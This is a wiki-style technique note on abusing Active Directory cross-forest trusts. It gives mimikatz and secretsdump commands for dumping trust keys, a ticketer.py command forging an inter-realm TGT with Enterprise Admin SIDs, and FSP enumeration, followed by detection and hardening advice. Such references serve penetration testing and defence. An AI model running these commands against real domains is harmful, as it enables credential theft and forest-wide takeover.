---
title: Cross-forest trust abuse
slug: cross-forest-trust-abuse
---

> **TL;DR:** Inter-forest trusts are crossable through three primitives — abusing the inter-realm trust key for ticket forgery, riding Foreign Security Principal memberships and explicit ACLs on objects in the trusting forest, and exploiting SID-History on legacy or misconfigured trusts where Quarantine is off.

## What it is
Forests are nominally separate security boundaries, joined by external or forest trusts. Each side stores a trust account (`TARGETFOREST$`) whose password is the inter-realm Kerberos key. SID filtering / Quarantine is on by default for forest trusts but is often disabled for compatibility, and the trust still allows users from forest A to be granted rights inside forest B via Foreign Security Principal (FSP) objects or direct ACL entries.

## Preconditions / where it applies
- Domain Admin (or DCSync rights) in the trusting forest so trust keys can be dumped
- Or: any user in the trusting forest with line of sight to a DC in the trusted forest (for ACL/FSP abuse)
- Trust direction matters — outbound trust means *your* forest accepts the other side's principals

## Technique
**1. Inter-realm trust key forgery (cross-forest TGT).** Dump the trust key, forge a referral TGT, present it to a DC in the partner forest.

```bash
# Dump the trust account NT hash on the trusting DC
lsadump::trust /patch        # mimikatz on a DC
# or via DCSync
secretsdump.py -just-dc-user 'CORP$' EXT/da:pass@dc.ext.local
```

Forge an inter-realm TGT and use it for an S4U2self/proxy chain into the partner:

```bash
ticketer.py -nthash <trust_nt> -domain-sid <ext_sid> -domain ext.local \
  -spn krbtgt/corp.local -extra-sid <corp_admins_sid> attacker
```

If quarantine is off, embedded `extraSids` granting Enterprise Admin in the partner forest are honoured.

**2. Foreign Security Principal abuse.** Enumerate FSPs in the target forest:

```bash
Get-ADObject -SearchBase "CN=ForeignSecurityPrincipals,DC=ext,DC=local" -Filter *
```

Each FSP is a SID stub pointing at a principal in your forest. If one of those SIDs is a member of a privileged group in `ext.local`, a TGT for that principal grants access. BloodHound's `ForeignGroupMembership` / `ForeignUser` edges map this automatically.

**3. ACL-across-trust.** Direct ACEs on objects in the trusted forest naming principals from your forest (or vice versa). Common findings: GenericAll on a service account, WriteDACL on an OU, GenericWrite on a GMSA.

## Detection and defence
- Enable Quarantine (SID Filtering) on every external/forest trust unless explicitly required; pair with selective authentication
- Audit FSP membership periodically — any principal from a less-trusted forest in Tier-0 groups is a finding
- Rotate trust account passwords on a fixed schedule (default is 30 days but commonly broken in old environments)
- Monitor cross-realm TGS_REQ (`Service Name` in `krbtgt/<partner>` realm) from unusual sources

## References
- [SpecterOps — Attacking domain trusts](https://posts.specterops.io/a-guide-to-attacking-domain-trusts-ef5cbe06e2e2) — canonical trust attack catalogue
- [Hacker Recipes — Trust relationships](https://www.thehacker.recipes/a-d/movement/trusts) — protocol detail + tooling
- [HackTricks — Forest, external, and parent-child trusts](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/external-forest-domain-oneway-outbound.html) — practical commands
- See also: [[child-to-forest-root]], [[golden-tickets]], [[bloodhound]]
